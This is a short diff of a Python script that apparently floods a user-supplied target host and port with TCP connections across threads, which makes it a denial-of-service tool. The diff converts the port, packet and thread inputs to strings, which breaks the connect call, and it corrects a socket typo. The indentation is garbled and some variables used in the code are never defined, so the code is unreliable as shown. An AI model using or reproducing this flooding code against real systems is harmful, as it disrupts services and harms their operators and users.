@@ -7,9 +7,9 @@ import random
 import threading
 
 ip = str(input('[+] Target: '))
-     port = int(input('[+] Port: '))
-            packet = int(input('[+] Packet/s: '))
-                     thread = int(input('[+] Threads: '))
+     port = str(input('[+] Port: '))
+            packet = str(input('[+] Packet/s: '))
+                     thread = str(input('[+] Threads: '))
 
 
                               def start():
@@ -17,7 +17,7 @@ ip = str(input('[+] Target: '))
                                        xx = int(0)
                                         while True:
                                         try:
-                                                s = socket.socket(socket.AF_INET, socket. SOCK_STREAM)
+                                                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                                             s.connect((ip,port))
                                                             s.send(hh)
                                                             for i in range(pack):
